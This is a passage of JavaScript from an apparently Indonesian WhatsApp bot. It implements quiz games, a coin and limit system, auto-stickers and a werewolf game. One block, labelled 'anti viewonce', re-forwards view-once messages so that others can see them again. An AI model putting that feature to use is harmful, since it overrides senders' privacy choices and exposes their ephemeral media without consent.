            Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
            ${isWin ? 
`Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
            ${Array.from(room.jawaban, (jawaban, index) => {
            return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
                }).filter(v => v).join('\n')}
                ${isSurender ? '' : `Perfect Player`}`.trim()
            bluz.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
            }
            
            if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
               adduangUser(sender, http, uang)
            await bluz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${global.botname} bot`, m)
            delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }
            
            if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
              adduangUser(sender, http, uang)
            await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? kirim ${prefix}math mode`)
            delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }
            
            if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
            adduangUser(sender, http, uang)
            await bluz.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${global.botname} bot`, m)
            delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }
            
            if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
             adduangUser(sender, http, uang)
            await bluz.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${global.botname} bot`, m)
            delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }
            
            if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
            deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
             adduangUser(sender, http, uang)
            await bluz.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${global.botname} bot`, m)
            delete caklontong[m.sender.split('@')[0]]
            delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }
            
            if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
               adduangUser(sender, http, uang)
            await bluz.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${global.botname} bot`, m)
            delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }
            
            if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
             adduangUser(sender, http, uang)
            await bluz.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${global.botname} bot`, m)
            delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }
            
                if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
              adduangUser(sender, http, uang)
            await bluz.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${global.botname} bot`, m)
            delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
            }

          /////////FUNTION LIMIT
const addlimit = (sender) => {
	const obj = {id: sender, limit : 0}
limit.push(obj)
fs.writeFileSync('./database/user/limit.json', JSON.stringify(limit))
}
const addlimitUser = (sender, amount) => {
	let position = false
Object.keys(limit).forEach((i) => {
if (limit[i].id === sender) {
    position = i
}
})
if (position !== false) {
limit[position].limit += amount
fs.writeFileSync('./database/user/limit.json', JSON.stringify(limit))
}
}

const checklimitUser = (sender) => {
	let position = false
Object.keys(limit).forEach((i) => {
if (limit[i].id === sender) {
    position = i
}
})
if (position !== false) {
return limit[position].limit
}
}
 
 const confirmlimit = (sender, amount) => {
   if (isPremium) {return false;}
 let position = false
Object.keys(limit).forEach((i) => {
if (limit[i].id == sender) {
    position = i
}
})
if (position !== false) {
limit[position].limit -= amount
fs.writeFileSync('./database/user/limit.json', JSON.stringify(limit))
}
}
//Checklimit
if ( isRegister ) {
const checklimit = checklimitUser(sender)
try {
if (checklimit === undefined) addlimit(sender)
addlimitUser(sender, point)
} catch (err) {
console.error(err)
}
}

	//BUTON MESAGE
	const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
        const butonna = {
        text: text1,
        footer: desc1,
        buttons: but,
        headerType: 1
        }
        bluz.sendMessage(id, butonna, options)
        }
const daftar1 = `Hai kak ${pushname} ${ucapanWaktu} \n\nSebelum Menggunakan ${global.botname} Daftar Terlebih Dahulu Ya `
const daftar2 = `Klik tombol di bawah \nJika tidak ada tombol ketik ${prefix}daftar\n*© ${global.botname}*`
const daftar3 = [{buttonId: `${prefix}daftar`,buttonText: {displayText: `DAFTAR `,},type: 1,},]
	    
const koinPerlimit = 100
const yaya = koinPerlimit * args[0]
const beli1 = (`*⟪ PEMBAYARAN BERHASIL ⟫*\n\n➸ pengirim : ${global.botname}\n➸ penerima : ${pushname}\n➸ nominal pembelian : ${q} \n➸ harga limit : ${koinPerlimit}/limit\n➸ sisa uang : ${checkuangUser(sender)}\n\nproses berhasil dengan SN\n${createSerial(15)}`)
const beli2 = `© ${global.botName} bot`
const beli3 = [
{buttonId: `${prefix}limit`, buttonText: {displayText: 'CEK LIMIT'}, type: 1}
]

//const koinPerlimit = 100
const ump = koinPerlimit * args[0]
const beliump1 = (`*⟪ PEMBAYARAN BERHASIL ⟫*\n\n➸ pengirim : ${global.botname}\n➸ penerima : ${pushname}\n➸ nominal pembelian : ${q} \n➸ harga umpan : ${koinPerlimit}/umpan\n➸ sisa uang : ${checkuangUser(sender)}\n\nproses berhasil dengan SN\n${createSerial(15)}`)
const beliump2 = `© ${global.botName} bot`
const beliump3 = [
{buttonId: `${prefix}mybag`, buttonText: {displayText: 'SISA UMPAN'}, type: 1}
]

try {
    ppuser = await bluz.profilePictureUrl(m.sender, 'image')
    } catch (err) {
    ppuser = 'https://tinyurl.com/yx93l6da'
    }
    ppnyauser = await reSize(ppuser, 300, 300)

    async function sendKaylaMessage(chatId, message, options = {}){
        let generate = await generateWAMessage(chatId, message, options)
        let type2 = getContentType(generate.message)
        if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
        if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
        return await bluz.relayMessage(chatId, generate.message, { messageId: generate.key.id })
    }

                // =====================] FCN WAKTU RAMDHAN HITUNG MUNDUR [========================
            
                let tanggal100 = new Date('22 Maret 2023 00:00:00').getTime();
                let sekarang10 = new Date().getTime();
                let selisih1 = tanggal100 - sekarang10;
        
                let harinye1 = Math.floor(selisih1 / (1000 * 60 * 60 * 24));
                let jamnye1 = Math.floor(selisih1 % (1000 * 60 * 60 * 24) / (1000 * 60 * 60));
                let menitnye1 = Math.floor(selisih1 % (1000 * 60 * 60) / (1000 * 60));
                let detiknye1 = Math.floor(selisih1 % (1000 * 60) / (1000));
        
                // ===================] FCN WAKTU RAMDHAN END HITUNG MUNDUR [=======================
            
                    // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await bluz.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await bluz.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        //Autosticker pc
                if (isAutoStick) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await bluz.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                await bluz.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }

                //anti viewonce
                if (m.mtype == 'viewOnceMessage') {
                    if (!db.data.chats[m.chat].antionce) return
                teks = 
`「 *Anti ViewOnce Message* 」
Name : ${m.pushName}
User : @${m.sender.split("@")[0]}
Clock : ${moment.tz('Asia/Kolkata').format('HH:mm:ss')} 
Date : ${moment.tz('Asia/Kolkata').format('DD/MM/YYYY')}
MessageType : ${m.mtype}`
                bluz.sendTextWithMentions(m.chat, teks, m)
                await sleep(500)
                m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => m.reply(`Maybe it's been opened by a bot`))
                }


const deploy = (teks) => {
    bluz.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
  }
        // Public & Self
        if (!bluz.public) {
            if (!m.key.fromMe) return
        }

        // Push Message To Console && Auto Read
        if (m.message) {
            bluz.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
        cron.schedule('0 0 * * *', () => {
          daily.restart(dbdaily)
          console.log('Daily database restart.')
        }, {
          scheduled: true,
          timezone: "Asia/Jakarta"
        });
	
	// reset limit every 12 hours
        // let cron = require('node-cron')
        // cron.schedule('00 12 * * *', () => {
        //     let user = Object.keys(global.db.data.users)
        //     let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
        //     for (let jid of user) global.db.data.users[jid].limit = limitUser
        //     console.log('Reseted Limit')
        // }, {
        //     scheduled: true,
        //     timezone: "Asia/Jakarta"
        // })
        // pm2 restart index --cron-restart="0 0 * * *"
    // WEREWOLF

    
    if (m.isGroup) {
        if (werewolf.checkallData(m.chat) !== false) {
            if (werewolf.checkallData(m.chat).status === true) {
                if (werewolf.checkallData(m.chat).time === "voting") {
                    if (command1 === prefix + "ww vote") {
                        if (werewolf.checkPlayer(m.chat, m.sender) === true) return bluz.sendMessage(m.chat, { text: "Tidak Terdaftar ❌" }, { quoted: m })
                        if (werewolf.dataPlayer(m.sender).isdead === true) return bluz.sendMessage(m.chat, { text: "Sudah Mati" }, { quoted: m })
                        getnya = args[1]
                        pler = werewolf.chatPC(m.sender)
                        if (werewolf.checkDeath(m.sender)) return bluz.sendMessage(m.chat, { text: "Kamu Sudah Mati" }, { quoted: m })
                        if (!getnya || getnya.length < 1) return bluz.sendMessage(m.chat, { text: "Masukan ID" }, { quoted: m })
                        if (isNaN(getnya)) return bluz.sendMessage(m.chat, { text: "ID Harus Berupa Nomor" }, { quoted: m })
                        if (werewolf.checkallData(m.chat).status === false) return bluz.sendMessage(m.chat, { text: "Game belum Dimulai" }, { quoted: m })
                        if (werewolf.checkVote(m.chat, m.sender) === true) return bluz.sendMessage(m.chat, { text: "Anda Sudah Memilih" }, { quoted: m })
                        b = werewolf.getPlayerById(m.sender, parseInt(getnya))
                        if (b.db.id === m.sender) return m.reply('Tidak dapat memvoting diri sendiri')
                        if (b.db.isdead === true) return m.reply(`Player ${getnya} sudah mati.`)
                        if (werewolf.totalPlayer(werewolf.getSesi(m.sender)) < parseInt(getnya)) return bluz.sendMessage(m.chat, { text: "ID player tidak boleh lebih dari jumlah player" }, { quoted: m })
                        if (werewolf.getPlayerById(m.sender, parseInt(getnya)) === false) return m.reply('Player tidak terdaftar!')
                        werewolf.vote(m.chat, parseInt(getnya), m.sender)
                        return bluz.sendMessage(m.chat, { text: "Vote ✅" }, { quoted: m })
                    }
                }
            }
        }
    }
    // ALUR GAME
    if (m.isGroup) {
        if (werewolf.chatPCData(m.sender, m.chat)) {
            if (werewolf.chatPCPlayer(m.sender)) {
                if (werewolf.chatPC(m.sender)) {
                    if (werewolf.chatPC(m.sender).id === m.sender) {
                        if (command1 === prefix + "ww player") {
                            if (!werewolf.chatPC(m.sender)) return bluz.sendMessage(m.chat, { text: "kamu belum memasuki game" })
                            let textnya = ""
                            var sesi = werewolf.getSesi(m.sender)
                            let membernya = []
                            werewolf.shortPlayer(m.chat)
                            for (let i = 0; i < werewolf.getPlayer(m.chat).length; i++) {
                                textnya += `[${werewolf.getPlayer(m.chat)[i].idny}] @${werewolf.getPlayer(m.chat)[i].id.replace("@s.whatsapp.net", "")} [${werewolf.getPlayer(m.chat)[i].isdead === true ? `Dead ${werewolf.getPlayer(m.chat)[i].role}` : "Life"}]\n`
                                membernya.push(werewolf.getPlayer(m.chat)[i].id)
                            }
                            return bluz.sendMessage(m.chat, { text: textnya, mentions: membernya }, { quoted: m })
                        }
                    }
                }
            }
        }
    }
    if (!m.isGroup) {
        if (werewolf.chatPCData(m.sender, m.chat) !== undefined) {
            if (werewolf.chatPCData(m.sender, m.chat).status === true) {
                if (werewolf.chatPCPlayer(m.sender) === true) {
                    if (werewolf.chatPC(m.sender).id === m.sender) {
                        if (werewolf.chatPCData(m.sender).time === "malem") {
                            werewolf.wargaTrue(m.chat)
                            if (werewolf.chatPC(m.sender).role === "werewolf") {
                                if (command1 === prefix + "ww kill") {
                                    getnya = args[1]
                                    if (werewolf.chatPC(m.sender).status === true) return m.reply('Sudah menggunakan skill')
                                    if (werewolf.dataPlayer(m.sender).isdead === true) return bluz.sendMessage(m.chat, { text: "Sudah Mati" }, { quoted: m })
                                    if (werewolf.checkDeath(m.sender)) return bluz.sendMessage(m.chat, { text: "Kamu Sudah Mati" }, { quoted: m })
                                    pler = werewolf.chatPC(m.sender)
                                    if (!getnya || getnya.length < 1) return bluz.sendMessage(m.chat, { text: "Masukan ID" }, { quoted: m })
                                    if (isNaN(getnya)) return bluz.sendMessage(m.chat, { text: "ID Harus Berupa Nomor" }, { quoted: m })
                                    if (werewolf.checkSkill(werewolf.getSesi(m.sender), m.sender)) return bluz.sendMessage(m.chat, { text: "Skill ini hanya bisa digunakan sekali tiap malam" }, { quoted: m })
                                    if (werewolf.totalPlayer(werewolf.getSesi(m.sender)) < parseInt(getnya)) return bluz.sendMessage(m.chat, { text: "ID player tidak boleh lebih dari jumlah player" }, { quoted: m })
                                    b = werewolf.getPlayerById(m.sender, parseInt(getnya))
                                    if (b.db.isdead === true) return m.reply(`Player ${getnya} sudah mati.`)
                                    if (b.db.id === m.sender) return m.reply('Tidak dapat menggunakan skill kepada diri sendiri')
                                    if (b.db.role === 'werewolf') return m.reply('Tidak dapat menggunakan skill kepada teman sendiri')
                                    if (b.db.role === 'sorcerer') return m.reply('Tidak dapat menggunakan skill kepada teman sendiri')
                                    a = werewolf.killwerewolf(m.sender, getnya)
                                    bluz.sendMessage(m.chat, { text: `Berhasil Membunuh Player ${getnya}` }, { quoted: m })
                                    werewolf.changeStatusPlayer(m.sender)
                                } else if (command1 === prefix + "ww player") {
                                    let textnya = ""
                                    var sesi = werewolf.getSesi(m.sender)
                                    let membernya = []
                                    werewolf.shortPlayer(sesi)
                                    for (let i = 0; i < werewolf.getPlayer(sesi).length; i++) {
                                        textnya += `[${werewolf.getPlayer(sesi)[i].idny}] @${werewolf.getPlayer(sesi)[i].id.replace("@s.whatsapp.net", "")} [${werewolf.getPlayer(sesi)[i].isdead === true ? `Dead ${werewolf.getPlayer(sesi)[i].role}` : "Life"}]\n`
                                        membernya.push(werewolf.getPlayer(sesi)[i].id)
                                    }
                                    bluz.sendMessage(m.chat, { text: textnya, mentions: membernya })
                                }
                            } else if (werewolf.chatPC(m.sender).role === "seer") {
                                if (command1 === prefix + "ww dreamy") {
                                    getnya = args[1]
                                    pler = werewolf.chatPC(m.sender)
                                    if (werewolf.chatPC(m.sender).status === true) return m.reply('Sudah menggunakan skill')
                                    if (werewolf.dataPlayer(m.sender).isdead === true) return bluz.sendMessage(m.chat, { text: "Sudah Mati" }, { quoted: m })
                                    if (!getnya || getnya.length < 1) return bluz.sendMessage(m.chat, { text: "Masukan ID" }, { quoted: m })
                                    if (isNaN(getnya)) return bluz.sendMessage(m.chat, { text: "ID Harus Berupa Nomor" }, { quoted: m })
                                    if (werewolf.checkSkill(werewolf.getSesi(m.sender), m.sender)) return bluz.sendMessage(m.chat, { text: "Skill ini hanya bisa digunakan sekali tiap malam" }, { quoted: m })
                                    if (werewolf.totalPlayer(werewolf.getSesi(m.sender)) < parseInt(getnya)) return bluz.sendMessage(m.chat, { text: "ID player tidak boleh lebih dari jumlah player" }, { quoted: m })
                                    b = werewolf.getPlayerById(m.sender, parseInt(getnya))
                                    if (b.db.isdead === true) return m.reply(`Player ${getnya} sudah mati.`)
                                    if (b.db.id === m.sender) return m.reply('Tidak dapat menggunakan skill kepada diri sendiri')
                                    let dreamy = werewolf.dreamySeer(m.sender, parseInt(getnya))
                                    bluz.sendMessage(m.chat, { text: `Berhasil Membuka Identitas ${getnya} Adalah ${dreamy}` }, { quoted: m })
                                    werewolf.changeStatusPlayer(m.sender)
                                } else if (command1 === prefix + "ww player") {
                                    let textnya = ""
                                    var sesi = werewolf.getSesi(m.sender)
                                    let membernya = []
                                    werewolf.shortPlayer(sesi)
                                    for (let i = 0; i < werewolf.getPlayer(sesi).length; i++) {
                                        textnya += `[${werewolf.getPlayer(sesi)[i].idny}] @${werewolf.getPlayer(sesi)[i].id.replace("@s.whatsapp.net", "")} [${werewolf.getPlayer(sesi)[i].isdead === true ? `Dead ${werewolf.getPlayer(sesi)[i].role}` : "Life"}]\n`
                                        membernya.push(werewolf.getPlayer(sesi)[i].id)
                                    }
                                    bluz.sendMessage(m.chat, { text: textnya, mentions: membernya }, { quoted: m })
                                }
                            } else if (werewolf.chatPC(m.sender).role === "guardian") {
                                if (command1 === prefix + "ww deff") {
                                    getnya = args[1]
                                    pler = werewolf.chatPC(m.sender)
                                    if (werewolf.chatPC(m.sender).status === true) return m.reply('Sudah menggunakan skill')
                                    if (werewolf.dataPlayer(m.sender).isdead === true) return bluz.sendMessage(m.chat, { text: "Sudah Mati" }, { quoted: m })
                                    if (!getnya || getnya.length < 1) return bluz.sendMessage(m.chat, { text: "Masukan ID" }, { quoted: m })
                                    if (isNaN(getnya)) return bluz.sendMessage(m.chat, { text: "ID Harus Berupa Nomor" }, { quoted: m })
                                    if (werewolf.checkSkill(werewolf.getSesi(m.sender), m.sender)) return bluz.sendMessage(m.chat, { text: "Skill ini hanya bisa digunakan sekali tiap malam" }, { quoted: m })
                                    if (werewolf.totalPlayer(werewolf.getSesi(m.sender)) < parseInt(getnya)) return bluz.sendMessage(m.chat, { text: "ID player tidak boleh lebih dari jumlah player" }, { quoted: m })
                                    b = werewolf.getPlayerById(m.sender, parseInt(getnya))
                                    if (b.db.isdead === true) return m.reply(`Player ${getnya} sudah mati.`)
                                    if (b.db.id === m.sender) return m.reply('Tidak dapat menggunakan skill kepada diri sendiri')
                                    werewolf.protectGuardian(m.sender, getnya)
                                    bluz.sendMessage(m.chat, { text: `Berhasil Melindungi Player ${getnya}` }, { quoted: m })
                                    werewolf.changeStatusPlayer(m.sender)
                                } else if (command1 === prefix + "ww player") {
                                    let textnya = ""
                                    var sesi = werewolf.getSesi(m.sender)
                                    let membernya = []
                                    werewolf.shortPlayer(sesi)
                                    for (let i = 0; i < werewolf.getPlayer(sesi).length; i++) {
                                        textnya += `[${werewolf.getPlayer(sesi)[i].idny}] @${werewolf.getPlayer(sesi)[i].id.replace("@s.whatsapp.net", "")} [${werewolf.getPlayer(sesi)[i].isdead === true ? `Dead ${werewolf.getPlayer(sesi)[i].role}` : "Life"}]\n`
                                        membernya.push(werewolf.getPlayer(sesi)[i].id)
                                    }
                                    bluz.sendMessage(m.chat, { text: textnya, mentions: membernya }, { quoted: m })
                                }
                            } else if (werewolf.chatPC(m.sender).role === "sorcerer") {
                                if (command1 === prefix + "ww sorcerer") {
                                    getnya = args[1]
                                    pler = werewolf.chatPC(m.sender)
                                    if (werewolf.chatPC(m.sender).status === true) return m.reply('Sudah menggunakan skill')
                                    if (werewolf.dataPlayer(m.sender).isdead === true) return bluz.sendMessage(m.chat, { text: "Sudah Mati" }, { quoted: m })
                                    if (!getnya || getnya.length < 1) return bluz.sendMessage(m.chat, { text: "Masukan ID" }, { quoted: m })
                                    if (isNaN(getnya)) return bluz.sendMessage(m.chat, { text: "ID Harus Berupa Nomor" }, { quoted: m })
                                    if (werewolf.checkSkill(werewolf.getSesi(m.sender), m.sender)) return bluz.sendMessage(m.chat, { text: "Skill ini hanya bisa digunakan sekali tiap malam" }, { quoted: m })
                                    if (werewolf.totalPlayer(werewolf.getSesi(m.sender)) < parseInt(getnya)) return bluz.sendMessage(m.chat, { text: "ID player tidak boleh lebih dari jumlah player" }, { quoted: m })
                                    b = werewolf.getPlayerById(m.sender, parseInt(getnya))
                                    if (b.db.isdead === true) return m.reply(`Player ${getnya} sudah mati.`)
                                    if (b.db.id === m.sender) return m.reply('Tidak dapat menggunakan skill kepada diri sendiri')
                                    let sorker = werewolf.sorcerer(werewolf.getSesi(m.sender), getnya)
                                    bluz.sendMessage(m.chat, { text: `Berhasil Membuka Identitas ${getnya} Adalah ${sorker}` }, { quoted: m })
                                    werewolf.changeStatusPlayer(m.sender)
                                } else if (command1 === prefix + "ww player") {
                                    let textnya = ""
                                    var sesi = werewolf.getSesi(m.sender)
                                    let membernya = []
                                    werewolf.shortPlayer(sesi)
                                    for (let i = 0; i < werewolf.getPlayer(sesi).length; i++) {
                                        textnya += `[${werewolf.getPlayer(sesi)[i].idny}] @${werewolf.getPlayer(sesi)[i].id.replace("@s.whatsapp.net", "")} [${werewolf.getPlayer(sesi)[i].isdead === true ? `Dead ${werewolf.getPlayer(sesi)[i].role}` : "Life"}]\n`
                                        membernya.push(werewolf.getPlayer(sesi)[i].id)
                                    }
                                    bluz.sendMessage(m.chat, { text: textnya, mentions: membernya }, { quoted: m })
                                }
                            } else if (werewolf.chatPC(m.sender).role === "warga") {
                                if (command1 === prefix + "ww player") {
                                    let textnya = ""
                                    var sesi = werewolf.getSesi(m.sender)
                                    let membernya = []
                                    werewolf.shortPlayer(sesi)
                                    for (let i = 0; i < werewolf.getPlayer(sesi).length; i++) {
                                        textnya += `[${werewolf.getPlayer(sesi)[i].idny}] @${werewolf.getPlayer(sesi)[i].id.replace("@s.whatsapp.net", "")} [${werewolf.getPlayer(sesi)[i].isdead === true ? `Dead ${werewolf.getPlayer(sesi)[i].role}` : "Life"}]\n`
                                        membernya.push(werewolf.getPlayer(sesi)[i].id)
                                    }
                                    bluz.sendMessage(m.chat, { text: textnya, mentions: membernya }, { quoted: m })
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    // COMMAND
    if (commandd === prefix + 'ww' || commandd === prefix + 'werewolf') {
        var sesi = m.chat
        if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
        var aff = body.split(' ')[1]
        if (aff === undefined || aff.length < 1) return bluz.sendMessage(m.chat, { text: "Masukan Command\nketik /ww help untuk melihat perinah" }, { quoted: m })
        if (aff === 'help') {
            textnya = `Perintah\n\n`
            textnya += `[${prefix}ww help] untuk menampilkan menu bantuan\n`
            textnya += `[${prefix}ww create] membuat game\n`
            textnya += `[${prefix}ww join] untuk join game\n`
            textnya += `[${prefix}ww start] untuk mulai game\n`
            textnya += `[${prefix}ww exit] untuk keluar dari game\n`
            textnya += `[${prefix}ww delete] untuk menghapus sesi game\n`
            textnya += `[${prefix}ww kill <id>] untuk membunuh player (werewolf)\n`
            textnya += `[${prefix}ww player] untuk melihat daftar player\n`
            textnya += `[${prefix}ww deff <id>] untuk melindungi player (guardian angel)\n`
            textnya += `[${prefix}ww dreamy <id>] untuk melihat identitas player (seer)\n`
            textnya += `[${prefix}ww sorcerer <id>] untuk melihat identitas player (sorcerer)\n`
            textnya += `[${prefix}ww vote <id>] untuk vote player\n\n`
            textnya += `Team\n`
            textnya += `Team Warga:\n`
            textnya += `[1]. Warga\n`
            textnya += `[2]. Guardian angel\n`
            textnya += `[3]. Seer\n`
            textnya += `Team Serigala :\n`
            textnya += `[1]. Werewolf\n`
            textnya += `[2]. Sorcerer`
            bluz.sendMessage(m.chat, { text: textnya }, { quoted: m })
        } else if (aff == 'create') {
            if (werewolf.checkData(m.chat) === true) return bluz.sendMessage(m.chat, { text: "Sesi Telah *Terbuat*" }, { quoted: m })
            werewolf.addData(m.chat)
            const sections = [
                {
                    title: "Werewolf Game",
                    rows: [
                        { title: "Join", rowId: ".ww join", description: "Untuk mengikuti game werewolf." },
                        { title: "Start", rowId: ".ww start", description: "Untuk memulai game werewolf." },
                    ]
                }
            ]
            const listMessage = {
                text: "Game baru telah dibuat",
                footer: `Min Player: 5\nTotal Player: 1`,
                title: "Werewolf Game",
                buttonText: "Clik here!",
                sections
            }
            bluz.sendMessage(m.chat, listMessage)
        } else if (aff == 'join') {
            if (werewolf.checkData(m.chat) === false) return bluz.sendMessage(m.chat, { text: "Tidak Ada *Sesi*" }, { quoted: m })
            if (werewolf.checkPlayer(m.chat, m.sender) === false) return bluz.sendMessage(m.chat, { text: "Sudah Masuk Sesi ✅" }, { quoted: m })
            if (werewolf.checkallData(m.chat).status === true) return bluz.sendMessage(m.chat, { text: "Sesi Telah *Dimulai*" }, { quoted: m })
            werewolf.addPlayer(m.chat, m.sender)
            const sections = [
                {
                    title: "Werewolf Game",
                    rows: [
                        { title: "Join", rowId: ".ww join", description: "Untuk mengikuti game werewolf." },
                        { title: "Start", rowId: ".ww start", description: "Untuk memulai game werewolf." },
                    ]
                }
            ]
            textnya = ''
            membernya = []
            for (let i = 0; i < werewolf.getPlayer(sesi).length; i++) {
                textnya += `[${werewolf.getPlayer(sesi)[i].idny}] @${werewolf.getPlayer(sesi)[i].id.replace("@s.whatsapp.net", "")}\n`
                membernya.push(werewolf.getPlayer(sesi)[i].id)
            }
            const listMessage = {
                text: `Berhasil bergabung!\n\n${textnya}`,
                footer: `Min Player: 5\nTotal Player: ${werewolf.dataSesi(m.chat).player.length}`,
                title: "Werewolf Game",
                buttonText: "Clik here!",
                sections,
                mentions: membernya
            }
            bluz.sendMessage(m.chat, listMessage)
        } else if (aff == 'start') {
            if (werewolf.checkData(m.chat) === false) return bluz.sendMessage(m.chat, { text: "Tidak Ada *Sesi*" }, { quoted: m })
            if (werewolf.checkPlayer(m.chat, m.sender)) return bluz.sendMessage(m.chat, { text: "Belum masuk *Sesi*" }, { quoted: m })
            if (!werewolf.isOwnerww) return bluz.sendMessage(m.chat, { text: "Hanya pemulai game saja yang bisa memulai game" }, { quoted: m })
            if (werewolf.checkallData(m.chat).status === true) return bluz.sendMessage(m.chat, { text: "Sesi Telah *Dimulai*" }, { quoted: m })
            if (werewolf.checkallData(m.chat).player.length < 5) return bluz.sendMessage(m.chat, { text: "Minimal 5 Player " }, { quoted: m })
            if (werewolf.checkallData(m.chat).player.length > 16) return bluz.sendMessage(m.chat, { text: "Jumlah player tidak boleh lebih dari 15" }, { quoted: m })
            let tok1 = ""
            let tok2 = ""
            werewolf.roleGenerator(m.chat)
            werewolf.getWaktu(m.chat)
            werewolf.StartingGame(m.chat)
            let membernya = []
            werewolf.shortPlayer(m.chat)
            for (let i = 0; i < werewolf.getPlayer(m.chat).length; i++) {
